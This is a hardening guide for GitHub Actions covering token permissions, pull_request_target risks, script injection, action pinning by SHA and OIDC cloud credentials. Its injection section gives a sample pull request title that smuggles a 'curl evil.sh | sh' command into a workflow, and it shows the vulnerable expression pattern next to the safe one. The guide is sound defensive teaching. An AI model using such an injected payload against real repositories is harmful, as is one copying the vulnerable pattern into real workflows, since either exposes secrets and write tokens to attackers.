# GitHub Actions hardening

A workflow runs with the repo's token and secrets, so a compromised action or an injected expression is a compromised repo. In order of impact:

## 1. Least-privilege token

```yaml
permissions:
  contents: read          # workflow default: read only

jobs:
  release:
    permissions:
      contents: write     # widen only in the job that needs it
      id-token: write     # only for OIDC
```

Also set **Settings → Actions → General → Workflow permissions** to read-only, so a workflow without a `permissions:` block does not get write access.

## 2. `pull_request_target` and `workflow_run`

They run in the context of the base branch **with secrets and a write token**, even for a pull request from a fork. Never check out or run the pull request's code in them (`ref: ${{ github.event.pull_request.head.sha }}` plus a build step is the classic breach). Use `pull_request` for anything that builds or tests contributed code; keep `pull_request_target` for labeling and commenting only.

## 3. Script injection

`${{ }}` is expanded before the shell runs, so a pull request titled `"; curl evil.sh | sh #` runs:

```yaml
# Vulnerable
- run: echo "${{ github.event.pull_request.title }}"
# Safe: pass untrusted values through env
- run: echo "$TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Untrusted: titles, bodies, branch names, commit messages, issue comments, and anything from `github.event` a contributor controls.

## 4. Pin actions by commit SHA

A tag can be moved to malicious code (tj-actions/changed-files, March 2025). Pin the full SHA with the version in a comment, and let a bot update it:

```yaml
- uses: actions/checkout@<full-40-char-sha> # v4.2.2
```

Dependabot with `package-ecosystem: github-actions`, or Renovate's `helpers:pinGitHubActionDigests`, keeps the SHAs current. Restrict which actions may run in **Settings → Actions → Allow select actions**.

## 5. OIDC instead of long-lived cloud keys

With `id-token: write`, the job exchanges a short-lived token for cloud credentials (AWS `aws-actions/configure-aws-credentials` with `role-to-assume`, GCP Workload Identity Federation, Azure federated credentials). Scope the cloud trust policy to this repo **and** a branch or environment through the `sub` claim, or any workflow in the repo can assume the role.

## 6. Other defaults

- `actions/checkout` with `persist-credentials: false` unless a later step pushes.
- Secrets in **Environments** with required reviewers for production; never print them, and never pass them to steps that run contributed code.
- No self-hosted runners on public repositories.
- Lint workflows in CI: `actionlint` for correctness, `zizmor` for security findings.
